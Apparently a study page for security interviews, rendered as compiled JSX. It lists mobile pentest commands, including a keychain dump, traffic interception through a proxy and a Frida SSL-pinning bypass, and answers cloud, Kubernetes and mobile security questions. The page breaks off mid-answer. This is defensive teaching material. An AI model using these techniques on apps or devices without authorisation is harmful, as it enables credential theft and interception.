        children: "# Run Falco\nfalco -c /etc/falco/falco.yaml\n\n# Test: spawn shell in container\ndocker run --rm -it alpine sh -c \"id\"\n\n# Expected alert:\n# 23:14:05.123456789: Warning Shell spawned in container\n# (user=root container_id=abc123 image=alpine shell=sh pid=42)\n\n# View Falco logs\njournalctl -u falco -n 50\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "mobile-app-commands",
      children: "Mobile App Commands"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# APK decompilation\njadx -d decompiled/ app.apk\n\n# Check manifest permissions\naapt dump permissions app.apk\n\n# iOS IPA analysis with objection\nobjection -g com.example.app explore\nios keychain dump\nios nsuserdefaults get\n\n# Set Android proxy for traffic interception\nadb shell settings put global http_proxy 10.0.2.2:8080\n\n# Frida SSL pinning bypass\nfrida -U -f com.example.app -l frida-scripts/ssl-bypass.js --no-pause\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "interview-corner",
      children: "Interview Corner"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cloud-security-interview-qa",
      children: "Cloud Security Interview Q&A"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q1: Explain the Shared Responsibility Model and give an example of a common misconfiguration."
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " The Shared Responsibility Model divides security responsibilities between the CSP and the customer. Security ", (0,jsx_runtime.jsx)(_components.em, {
        children: "of"
      }), " the Cloud (physical, hardware, networking) is the provider's responsibility. Security ", (0,jsx_runtime.jsx)(_components.em, {
        children: "in"
      }), " the Cloud (data, applications, IAM, network configuration) is the customer's. Example: S3 bucket with public read access — AWS secures the S3 service itself, but the customer is responsible for bucket policies. Leaving a bucket public is a customer-side misconfiguration — and the most common cause of cloud data breaches."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Complexity:"
      }), " O(1) to understand the concept; O(n) to implement across n services."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q2: What is the difference between CSPM, CWPP, CASB, and CIEM?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "CSPM"
        }), " (Cloud Security Posture Management): Checks misconfigurations and compliance against benchmarks (CIS, NIST, SOC 2). Tools: AWS Config, Wiz, Prisma Cloud."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "CWPP"
        }), " (Cloud Workload Protection Platform): Protects workloads (VMs, containers, serverless) with anti-malware, intrusion detection, and FIM. Tools: CrowdStrike, Trend Micro, Falco."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "CASB"
        }), " (Cloud Access Security Broker): Sits between users and cloud apps for DLP, shadow IT discovery, and access control. Modes: API, forward proxy, reverse proxy. Tools: Netskope, Zscaler, McAfee MVISION."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "CIEM"
        }), " (Cloud Infrastructure Entitlement Management): Manages cloud IAM permissions at scale — detects unused permissions, over-privileged roles, and cross-account access paths. Tools: AWS IAM Access Analyzer, Ermetic, CloudSplainer."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Edge Case:"
      }), " These tools overlap. A modern CNAPP (Cloud Native Application Protection Platform) integrates CSPM + CWPP + CIEM capabilities."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q3: How would you secure a Kubernetes cluster in production?"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " A 10-point K8s security checklist:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "RBAC:"
        }), " Least privilege for all service accounts, users, and groups. Use Role over ClusterRole where possible."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Pod Security Standards:"
        }), " Enforce ", (0,jsx_runtime.jsx)(_components.code, {
          children: "restricted"
        }), " level on namespaces via labels."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Network Policies:"
        }), " Default deny ingress/egress, allow only required east-west traffic."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Admission Controllers:"
        }), " OPA/Gatekeeper or Kyverno for custom policies (e.g., \"all images from trusted registry\")."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Secrets Management:"
        }), " External secrets operator (AWS Secrets Manager, HashiCorp Vault), encrypt etcd."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Image Scanning:"
        }), " Trivy or Clair for vulnerability scanning in CI/CD pipeline."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Runtime Security:"
        }), " Falco for syscall-level threat detection."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "CIS Benchmark:"
        }), " Run kube-bench weekly."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Audit Logging:"
        }), " Enable Kubernetes audit log, ship to SIEM."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Node Security:"
        }), " Minimize node access, use OS-level hardening, disable SSH."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q4: What caused the Capital One 2019 breach and how could it have been prevented?"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " A SSRF vulnerability in ModSecurity WAF allowed the attacker to query the EC2 metadata endpoint (", (0,jsx_runtime.jsx)(_components.code, {
        children: "169.254.169.254"
      }), "), retrieve IAM role credentials, and access S3 buckets containing 100M+ customer records."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Prevention:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "IMDSv2 mandatory"
        }), " — requires session token for metadata access."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Least privilege IAM"
        }), " — WAF role should NOT have S3:ListAllBuckets."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "WAF rules to block SSRF"
        }), " — block requests to 169.254.169.254 and other internal IPs."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Network-level protection"
        }), " — metadata endpoint access restricted via hop limit."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SCP"
        }), " — Service Control Policy to limit resource access at the OU level."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q5: Compare serverless security vs traditional VM security."
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Aspect"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Serverless"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Traditional VM"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "OS patching"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Provider managed"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customer responsibility"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Attack surface"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Event-driven, short-lived"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Always-on, persistent"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IAM complexity"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Per-function roles"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Per-instance roles"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Dependency risk"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High (includes runtime deps)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Moderate (package manager)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cold start attacks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Possible (container reuse)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Not applicable"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "DDoS mitigation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Automatic scaling + throttling"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Auto-scaling groups + WAF"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Debugging"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Limited (no SSH)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full (SSH, RDP)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cost model"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pay-per-invocation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Pay-per-hour"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Key insight:"
      }), " Serverless shifts responsibility from infrastructure to code + IAM. You no longer patch kernels, but you must validate every event input."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "container--kubernetes-interview-qa",
      children: "Container & Kubernetes Interview Q&A"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q6: What is a container escape and how do you prevent it?"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " Container escape is when a process breaks out of the container namespace isolation to access the host OS. Attack vectors include:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Kernel exploit via a vulnerable syscall (CVE-2022-0492 — cgroup escape)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Misconfigured capabilities (CAP_SYS_ADMIN, CAP_DAC_OVERRIDE)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Mounting host paths (docker.sock, /proc, /sys)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Privileged container (—privileged flag)."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Prevention (defense in depth):"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Run as non-root (", (0,jsx_runtime.jsx)(_components.code, {
          children: "USER appuser"
        }), " in Dockerfile)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Drop all capabilities (", (0,jsx_runtime.jsx)(_components.code, {
          children: "—cap-drop ALL —cap-add NET_BIND_SERVICE"
        }), ")."]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use seccomp profile (default or custom)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Enable AppArmor/SELinux."
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Read-only root filesystem (", (0,jsx_runtime.jsx)(_components.code, {
          children: "—read-only"
        }), ")."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Pod Security Standards (", (0,jsx_runtime.jsx)(_components.code, {
          children: "restricted"
        }), " level)."]
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "User namespace remapping (re-map container UID 0 to non-privileged host UID)."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q7: What is the difference between a Role and a ClusterRole in Kubernetes?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Role:"
        }), " Namespaced — grants permissions within a single namespace. Use for app-specific access (e.g., \"developer can manage pods in namespace ", (0,jsx_runtime.jsx)(_components.code, {
          children: "staging"
        }), "\")."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "ClusterRole:"
        }), " Cluster-wide — grants permissions across all namespaces (resources like pods, services), cluster-scoped resources (nodes, PVs, CSIDrivers), and non-resource endpoints (/healthz, /livez)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Decision rule:"
      }), " If the resource is namespaced (pods, services, deployments) and the access should be limited to one namespace, use Role + RoleBinding. If the resource is cluster-scoped (nodes, storage classes) or the access should apply globally, use ClusterRole + ClusterRoleBinding."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q8: How does Falco detect runtime threats in containers?"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " Falco uses kernel-level monitoring (eBPF or kernel module) to intercept every syscall made by userspace processes. The rule engine evaluates each syscall event against a set of rules defined in YAML."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Rule structure:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "condition:"
        }), " Boolean expression combining syscall fields (evt.type, proc.name, container.id, fd.name)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "output:"
        }), " Alert message template with dynamic fields."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "priority:"
        }), " EMERGENCY, ALERT, CRITICAL, ERROR, WARNING, NOTICE, INFO, DEBUG."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "tags:"
        }), " MITRE ATT&CK mappings, container, filesystem, etc."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Example detection:"
      }), " When a shell is spawned inside a container (", (0,jsx_runtime.jsx)(_components.code, {
        children: "spawned_process and container and shell_procs"
      }), "), Falco matches the execve syscall and fires a WARNING alert."]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Performance overhead:"
      }), " 1-3% CPU on standard workloads. Can handle 100K+ events/second."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q9: What is the serverless N+1 problem and how do you solve it?"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " The N+1 problem occurs when a serverless function calls another function per-item in a loop. For example:"]
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "API Gateway -> Lambda A (processes 1000 items -> calls Lambda B for each item)\nLambda B (calls Lambda C for each sub-item)\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This creates exponential cost (1000 Lambda B invocations * N sub-items) and latency (sequential execution)."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Solutions:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Step Functions"
        }), " — orchestrate workflow with parallel execution branches."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SQS + batch processing"
        }), " — buffer items in SQS, process in batch of 10 per invocation."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "DynamoDB Streams + Lambda"
        }), " — fan-out without recursive function calls."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "EventBridge Pipes"
        }), " — source-to-target with optional enrichment."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q10: Explain envelope encryption and why it's used in cloud environments."
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " Envelope encryption encrypts data with a Data Encryption Key (DEK), then encrypts the DEK with a Key Encryption Key (KEK) stored in KMS/HSM."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Benefits:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Performance:"
        }), " DEK operations are local AES-NI (fast); only KEK operations require KMS API call."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Key rotation:"
        }), " Re-encrypt DEK with new KEK without re-encrypting data. DEK stays the same; only the wrapped version changes."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Security:"
        }), " KEK never leaves the KMS/HSM boundary. Even with access to encrypted data and encrypted DEK, attacker cannot decrypt without KMS access."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Scale:"
        }), " One KEK can protect millions of DEKs. Each data item (or user, or session) can have a unique DEK."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Where used:"
      }), " S3 SSE-KMS, EBS encryption, RDS encryption, client-side encryption libraries (AWS Encryption SDK)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "mobile-security-interview-qa",
      children: "Mobile Security Interview Q&A"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q11: How does iOS sandboxing differ from Android sandboxing?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "iOS:"
        }), " Container-based sandboxing. Each app has a container directory (", (0,jsx_runtime.jsx)(_components.code, {
          children: "/var/mobile/Containers/Data/Application/<UUID>/"
        }), "). Apps cannot access other apps' containers. System files are protected by sandbox profiles (TrustedBSD MAC). Mandatory code signing ensures only Apple-certified binaries execute."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Android:"
        }), " UID-based sandboxing. Each app runs as a unique Linux user (u0_a123). App A's files are owned by user A; user B cannot read them. SELinux enforces MAC on top of Linux DAC (discretionary access control)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Key difference:"
      }), " iOS sandboxing is container-based with hardware-backed encryption. Android sandboxing is UID-based with SELinux MAC. Both effectively isolate apps, but iOS adds mandatory code signing (only Apple-signed code runs) which Android does not enforce for side-loaded apps."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q12: What is the FORCEDENTRY vulnerability and why was it significant?"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " FORCEDENTRY (CVE-2021-30860) was a zero-click iOS exploit used by NSO Group's Pegasus spyware. It exploited an integer overflow in CoreGraphics PDF parser triggered by receiving an iMessage — no user interaction required."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Significance:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "First widely-known zero-click iOS exploit — no user tap needed."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Affected fully-patched iOS devices (iOS 14.6)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Demonstrated that sandbox + code signing alone are insufficient against state-level actors."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Led directly to BlastDoor isolation architecture in iOS 14+ (iMessage processing in separate sandboxed daemon)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Showed the arms race: hardware security (Secure Enclave, PAC) vs software exploitation (kernel vulns, parser bugs)."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q13: How would you test a mobile app for insecure data storage (M7)?"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " A systematic M7 testing methodology:"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Static analysis:"
        }), " Decompile APK (jadx) or analyze IPA, search for hardcoded credentials, API keys, tokens in source."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SharedPreferences/NSUserDefaults:"
        }), " Run app, inspect for plaintext credentials in ", (0,jsx_runtime.jsx)(_components.code, {
          children: "shared_prefs/*.xml"
        }), " (Android) or ", (0,jsx_runtime.jsx)(_components.code, {
          children: "NSUserDefaults"
        }), " (iOS via objection)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "SQLite databases:"
        }), " Check for unencrypted PII in ", (0,jsx_runtime.jsx)(_components.code, {
          children: ".db"
        }), " files."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Logcat/console logs:"
        }), " Monitor ", (0,jsx_runtime.jsx)(_components.code, {
          children: "adb logcat"
        }), " for sensitive data in logs."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cache directory:"
        }), " Check WebView cache, image cache for sensitive content."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Keychain/Keystore:"
        }), " Verify accessibility level — ", (0,jsx_runtime.jsx)(_components.code, {
          children: "kSecAttrAccessibleWhenUnlockedThisDeviceOnly"
        }), " for iOS, ", (0,jsx_runtime.jsx)(_components.code, {
          children: "EncryptedSharedPreferences"
        }), " for Android."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Backup:"
        }), " Check if app allows backup (android:allowBackup=\"true\") — sensitive data may leak via ADB backup."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Clipboard:"
        }), " Verify app doesn't copy sensitive data to clipboard (accessible by other apps)."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q14: What is MDM and how does it differ from MAM?"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MDM"
        }), " (Mobile Device Management): Manages the entire device — passcode policy, encryption enforcement, remote wipe, network configuration, app whitelist/blacklist. Used for corporate-owned devices where the company has full control."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MAM"
        }), " (Mobile Application Management): Manages only specific applications — app configuration, data leakage prevention (copy/paste restrictions, screen capture blocking), app-level wipe. Used for BYOD scenarios where the device is personal but work apps need protection."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "BYOD best practice:"
      }), " Use MAM + OS-level work profile (Android Work Profile, iOS User Enrollment) rather than full MDM. This protects corporate data without compromising the employee's privacy."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Q15: Explain the OWASP Mobile Top 10 M5 vulnerability and how to fix it."
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
      children: [(0,jsx_runtime.jsx)(_components.strong, {
        children: "Answer:"
      }), " M5 — Insecure Communication: Mobile app transmits sensitive data over an insecure channel (unencrypted HTTP, weak TLS, missing certificate validation)."]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Detection:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Intercept traffic with Burp Suite."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Look for HTTP (not HTTPS) connections."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Check for missing certificate pinning (client trusts any CA-signed cert)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Verify hostname validation is enabled."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Check for weak cipher suites (TLS 1.0/1.1, RC4, 3DES)."
      }), "\n"]
